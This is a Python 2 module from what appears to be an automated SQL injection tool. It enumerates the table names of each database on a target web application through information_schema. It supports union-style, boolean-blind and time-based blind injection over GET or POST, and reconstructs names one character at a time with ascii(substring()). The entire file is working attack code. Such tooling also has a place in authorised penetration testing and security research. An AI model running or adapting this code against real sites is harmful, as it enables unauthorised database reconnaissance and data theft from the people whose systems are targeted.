#!/usr/bin/env python
# -*- coding:utf-8 -*-
from sqlier.config import UnpackFunction
from lib.log import logger
from database import SqliDatabases
from tqdm import trange
from lib.dealpayload import build_injection
from lib.dealpayload import time_injection
from lib.dealpayload import normal_injection

__author__ = "LoRexxar"


# 获取表名
class SqliTables(SqliDatabases):
    def __init__(self):
        SqliDatabases.__init__(self)

    def get_tables(self):

        # 若databases_name未设置，就跑一下
        if len(self.databases_name) == 0:
            logger.debug("Set the parameters of the self.databases_name...")
            SqliDatabases.get_database(self)

        # 每个databases_name需要跑一次tables_name
        for database_name in self.databases_name:
            # 开始跑database_name
            logger.debug("Start sqli databases %s's tables_name" % database_name)
            tables_name = []

            if self.sqlirequest == "GET":
                logger.debug("The sqlirequest is %s, start sqli tables..." % self.sqlirequest)

                if self.sqlimethod == "normal":

                    logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                    logger.debug("Start table amount sqli...")
                    # 先注tables的数量

                    tables_number = normal_injection(select='COUNT(*)',
                                                     source="information_schema.tables",
                                                     conditions="table_schema = '" + database_name + "'",
                                                     dealpayload=self.dealpayload,
                                                     data=self.Data, isCount=True, sqlirequest=self.sqlirequest
                                                     )

                    logger.debug("Table account sqli success...The tables_number is %d..." % tables_number)
                    print "[*] tables_number: %d" % tables_number

                    # 每个循环跑一次tables的数据
                    for i in trange(int(tables_number), desc="Table sqli...", leave=False, disable=True):
                        # 首先是tablename的长度
                        logger.debug("Start %dth table length sqli..." % (i + 1))

                        table_name_len = normal_injection(select='length(table_name)',
                                                          source="information_schema.tables",
                                                          conditions="table_schema = '" + database_name + "'",
                                                          limit=i,
                                                          dealpayload=self.dealpayload,
                                                          data=self.Data, isCount=True, sqlirequest=self.sqlirequest
                                                          )

                        logger.debug("%dth Table name length sqli success...The table_name_len is %d..." % ((i + 1), table_name_len))
                        logger.info("[*] %dth table_name_len: %d" % ((i + 1), table_name_len))

                        # 然后注tablename
                        logger.debug("Start %dth table name sqli..." % (i + 1))

                        table_name = normal_injection(select='table_name',
                                                      source='information_schema.tables',
                                                      conditions="table_schema = '" + database_name + "'", limit=i,
                                                      dealpayload=self.dealpayload,
                                                      data=self.Data, isStrings=True, sqlirequest=self.sqlirequest
                                                      )

                        logger.debug("%dth Table name sqli success...The table_name is %s..." % ((i + 1), table_name))

                        # 把table_name插入列表
                        tables_name.append(table_name)
                        logger.info("[*] %dth table_name: %s" % ((i + 1), table_name))

                elif self.sqlimethod == "build":

                    logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                    logger.debug("Start table amount sqli...")

                    retVal = build_injection(select="COUNT(table_name)",
                                             source="information_schema.tables",
                                             conditions="table_schema = '" + database_name + "'",
                                             dealpayload=self.dealpayload, data=self.Data, lens=self.len,
                                             isCount=True, sqlirequest=self.sqlirequest)
                    tables_number = int(retVal)

                    logger.debug("Tables amount sqli success...The tables_number is %d..." % tables_number)
                    logger.info("[*] tables_number: %d" % tables_number)

                    for i in range(0, int(tables_number)):
                        # 然后注tables_name 的 length
                        logger.debug("Start %dth table length sqli..." % (i + 1))

                        retVal = build_injection(select="length(table_name)",
                                                 source="information_schema.tables",
                                                 conditions="table_schema = '" + database_name + "'",
                                                 limit=i,
                                                 dealpayload=self.dealpayload, data=self.Data, lens=self.len,
                                                 isCount=True, sqlirequest=self.sqlirequest)
                        table_name_len = int(retVal)

                        logger.debug("%dth Table name length sqli success...The table_name_len is %d..." % ((i + 1), table_name_len))
                        logger.info("[*] %dth table_name_len: %d" % ((i + 1), table_name_len))

                        # 然后注tables名字
                        # 清空table_name
                        table_name = ""
                        logger.debug("Start %dth table sqli..." % (i + 1))

                        for j in trange(int(table_name_len), desc='%dth Table sqli' % (i + 1), leave=False):
                            retVal = build_injection(select="ascii(substring(table_name," + repr(j + 1) + ",1))",
                                                     source="information_schema.tables",
                                                     conditions="table_schema = '" + database_name + "'",
                                                     limit=i,
                                                     dealpayload=self.dealpayload, data=self.Data, lens=self.len,
                                                     isStrings=True, sqlirequest=self.sqlirequest)
                            table_name += chr(retVal)

                        logger.debug("%dth Table name sqli success...The table_name is %s..." % ((i + 1), table_name))

                        # 把table_name插入列表
                        tables_name.append(table_name)
                        logger.info("[*] %dth table_name: %s" % ((i + 1), table_name))

                elif self.sqlimethod == "time":

                    logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                    logger.debug("Start table amount sqli...")

                    retVal = time_injection(select="COUNT(table_name)",
                                            source="information_schema.tables",
                                            conditions="table_schema = '" + database_name + "'",
                                            dealpayload=self.dealpayload, data=self.Data, times=self.time,
                                            isCount=True, sqlirequest=self.sqlirequest)
                    tables_number = int(retVal)

                    logger.debug("Tables amount sqli success...The tables_number is %d..." % tables_number)
                    logger.info("[*] tables_number: %d" % tables_number)

                    for i in range(0, int(tables_number)):
                        # 然后注tables_number 的length
                        logger.debug("Start %dth table length sqli..." % (i + 1))

                        retVal = time_injection(select="length(table_name)",
                                                source="information_schema.tables",
                                                conditions="table_schema = '" + database_name + "'",
                                                limit=i,
                                                dealpayload=self.dealpayload, data=self.Data, times=self.time,
                                                isCount=True, sqlirequest=self.sqlirequest)
                        table_name_len = int(retVal)

                        logger.debug("%dth Table name length sqli success...The table_name_len is %d..." % ((i + 1), table_name_len))
                        logger.info("[*] %dth table_name_len: %d" % ((i + 1), table_name_len))

                        # 然后注tables名字
                        # 清空table_name
                        table_name = ""
                        logger.debug("Start %dth table sqli..." % (i + 1))

                        for j in trange(int(table_name_len), desc='%dth Table sqli' % (i + 1), leave=False):
                            retVal = time_injection(select="ascii(substring(table_name," + repr(j + 1) + ",1))",
                                                    source="information_schema.tables",
                                                    conditions="table_schema = '" + database_name + "'",
                                                    limit=i,
                                                    dealpayload=self.dealpayload, data=self.Data, times=self.time,
                                                    isStrings=True, sqlirequest=self.sqlirequest)
                            table_name += chr(retVal)

                        logger.debug("%dth Table name sqli success...The table_name is %s..." % ((i + 1), table_name))

                        # 把tables_name插入列表
                        tables_name.append(table_name)
                        logger.info("[*] %dth table_name: %s" % ((i + 1), table_name))

            # 然后是post
            elif self.sqlirequest == "POST":
                logger.debug("The sqlirequest is %s, start sqli tables..." % self.sqlirequest)

                if self.sqlimethod == "normal":

                    logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                    logger.debug("Start table amount sqli...")

                    # 先注tables的数量

                    tables_number = normal_injection(select='COUNT(*)',
                                                     source="information_schema.tables",
                                                     conditions="table_schema = '" + database_name + "'",
                                                     dealpayload=self.dealpayload,
                                                     data=self.Data, isCount=True, sqlirequest=self.sqlirequest
                                                     )

                    logger.debug("Table account sqli success...The tables_number is %d..." % tables_number)
                    print "[*] tables_number: %d" % tables_number

                    # 每个循环跑一次tables的数据
                    for i in trange(int(tables_number), desc="Table sqli...", leave=False, disable=True):
                        # 首先是tablename的长度
                        logger.debug("Start %dth table length sqli..." % (i + 1))

                        table_name_len = normal_injection(select='length(table_name)',
                                                          source="information_schema.tables",
                                                          conditions="table_schema = '" + database_name + "'",
                                                          limit=i,
                                                          dealpayload=self.dealpayload,
                                                          data=self.Data, isCount=True, sqlirequest=self.sqlirequest
                                                          )

                        logger.debug("%dth Table name length sqli success...The table_name_len is %d..." % ((i + 1), table_name_len))
                        logger.info("[*] %dth table_name_len: %d" % ((i + 1), table_name_len))

                        # 然后注tablename
                        logger.debug("Start %dth table name sqli..." % (i + 1))

                        table_name = normal_injection(select='table_name',
                                                      source='information_schema.tables',
                                                      conditions="table_schema = '" + database_name + "'", limit=i,
                                                      dealpayload=self.dealpayload,
                                                      data=self.Data, isStrings=True, sqlirequest=self.sqlirequest
                                                      )

                        logger.debug("%dth Table name sqli success...The table_name is %s..." % ((i + 1), table_name))

                        # 把tables_name插入列表
                        tables_name.append(table_name)
                        logger.info("[*] %dth table_name: %s" % ((i + 1), table_name))

                elif self.sqlimethod == "build":

                    logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                    logger.debug("Start table amount sqli...")

                    retVal = build_injection(select="COUNT(table_name)",
                                             source="information_schema.tables",
                                             conditions="table_schema = '" + database_name + "'",
                                             dealpayload=self.dealpayload, data=self.Data, lens=self.len,
                                             isCount=True, sqlirequest=self.sqlirequest)
                    tables_number = int(retVal)

                    logger.debug("Tables amount sqli success...The tables_number is %d..." % tables_number)
                    logger.info("[*] tables_number: %d" % tables_number)

                    for i in range(0, int(tables_number)):
                        # 然后注table_name 的 length
                        logger.debug("Start %dth table length sqli..." % (i + 1))

                        retVal = build_injection(select="length(table_name)",
                                                 source="information_schema.tables",
                                                 conditions="table_schema = '" + database_name + "'",
                                                 limit=i,
                                                 dealpayload=self.dealpayload, data=self.Data, lens=self.len,
                                                 isCount=True, sqlirequest=self.sqlirequest)
                        table_name_len = int(retVal)

                        logger.debug("%dth Table name length sqli success...The table_name_len is %d..." % ((i + 1), table_name_len))
                        logger.info("[*] %dth table_name_len: %d" % ((i + 1), table_name_len))

                        # 然后注tables名字
                        # 清空table_name
                        table_name = ""
                        logger.debug("Start %dth table sqli..." % (i + 1))
                        for j in trange(int(table_name_len), desc='%dth Table sqli' % (i + 1), leave=False):
                            retVal = build_injection(select="ascii(substring(table_name," + repr(j + 1) + ",1))",
                                                     source="information_schema.tables",
                                                     conditions="table_schema = '" + database_name + "'",
                                                     limit=i,
                                                     dealpayload=self.dealpayload, data=self.Data, lens=self.len,
                                                     isStrings=True, sqlirequest=self.sqlirequest)
                            table_name += chr(retVal)

                            logger.debug("%dth Table name sqli success...The table_name is %s..." % ((i + 1), table_name))

                        # 把tables_name插入列表
                        tables_name.append(table_name)
                        logger.info("[*] %dth table_name: %s" % ((i + 1), table_name))

                elif self.sqlimethod == "time":

                    logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                    logger.debug("Start table amount sqli...")

                    retVal = time_injection(select="COUNT(table_name)",
                                            source="information_schema.tables",
                                            conditions="table_schema = '" + database_name + "'",
                                            dealpayload=self.dealpayload, data=self.Data, times=self.time,
                                            isCount=True, sqlirequest=self.sqlirequest)
                    tables_number = int(retVal)

                    logger.debug("Tables amount sqli success...The tables_number is %d..." % tables_number)
                    logger.info("[*] tables_number: %d" % tables_number)

                    for i in range(0, int(tables_number)):
                        # 然后注tables_number 的length
                        logger.debug("Start %dth table length sqli..." % (i + 1))
                        retVal = time_injection(select="length(table_name)",
                                                source="information_schema.tables",
                                                conditions="table_schema = '" + database_name + "'",
                                                limit=i,
                                                dealpayload=self.dealpayload, data=self.Data, times=self.time,
                                                isCount=True, sqlirequest=self.sqlirequest)
                        table_name_len = int(retVal)

                        logger.debug("%dth Table name length sqli success...The table_name_len is %d..." % ((i + 1), table_name_len))
                        logger.info("[*] %dth table_name_len: %d" % ((i + 1), table_name_len))

                        # 然后注tables名字
                        # 清空table_name
                        table_name = ""
                        logger.debug("Start %dth table sqli..." % (i + 1))

                        for j in trange(int(table_name_len), desc='%dth Table sqli' % (i + 1), leave=False):
                            retVal = time_injection(select="ascii(substring(table_name," + repr(j + 1) + ",1))",
                                                    source="information_schema.tables",
                                                    conditions="table_schema = '" + database_name + "'",
                                                    limit=i,
                                                    dealpayload=self.dealpayload, data=self.Data, times=self.time,
                                                    isStrings=True, sqlirequest=self.sqlirequest)
                            table_name += chr(retVal)

                        logger.debug("%dth Table name sqli success...The table_name is %s..." % ((i + 1), table_name))

                        # 把tables_name插入列表
                        tables_name.append(table_name)
                        logger.info("[*] %dth table_name: %s" % ((i + 1), table_name))

            self.tables_name[database_name] = tuple(tables_name)

        print "[*] tables_name list: ", self.tables_name
